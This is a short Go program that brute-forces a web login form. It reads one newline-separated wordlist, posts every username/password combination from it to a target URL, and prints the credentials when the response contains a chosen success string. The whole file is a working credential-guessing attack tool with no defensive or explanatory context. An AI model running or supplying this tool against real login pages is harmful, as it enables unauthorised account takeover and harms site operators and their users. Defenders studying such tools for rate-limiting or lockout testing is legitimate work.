
package main

import (
	"log"
	"fmt"
	"os"
	"flag"
	"net/url"
	"net/http"
	"io/ioutil"
	"strings"
)


type Options struct{
	url		string
	user	string
	pass	string
	hit		string
	passList	string
}


var OPTIONS = Options{}


func parseOptions() {
	if len(os.Args) != 11 {
		fmt.Printf("Usage: %s -url <URL> -user <INPUT-USER> -pass <INPUT-PASS> -hit <HIT-MESSAGE> -passlist\nPassword list should be separated with newline\n", os.Args[0])
		os.Exit(1)
	}

	flag.StringVar(&OPTIONS.url, "url", "", "URL string")
	flag.StringVar(&OPTIONS.user, "user", "", "Username input name")
	flag.StringVar(&OPTIONS.pass, "pass", "", "Password input name")
	flag.StringVar(&OPTIONS.hit, "hit", "", "Password input name")
	flag.StringVar(&OPTIONS.passList, "passlist", "", "Password list")
	flag.Parse()
}


func auth(username, password string) {
	buf := url.Values{}
	buf.Add(OPTIONS.user, username)
	buf.Add(OPTIONS.pass, password)
	req, err := http.PostForm(OPTIONS.url, buf)
	if err != nil {
		return
	}
	defer req.Body.Close()

	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return
	}

	if strings.Contains(string(body), OPTIONS.hit) {
		log.Printf("Found!\nUsername= %s\nPassword= %s\n", username, password)
		os.Exit(0)
	}
}


func main() {
	parseOptions()
	buffer := make([]byte, 500000) // 500K(almost)
	file, err := os.Open(OPTIONS.passList)
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	EOB, err := file.Read(buffer)
	if err != nil {
		log.Fatalln(err)
	}

	list := strings.Split(string(buffer[:EOB]), "\n")
	for _,user := range list {
		for _,pass := range list {
			fmt.Println("Checking username=", user, "\t", "password=", pass)
			auth(user, pass)
		}
	}
}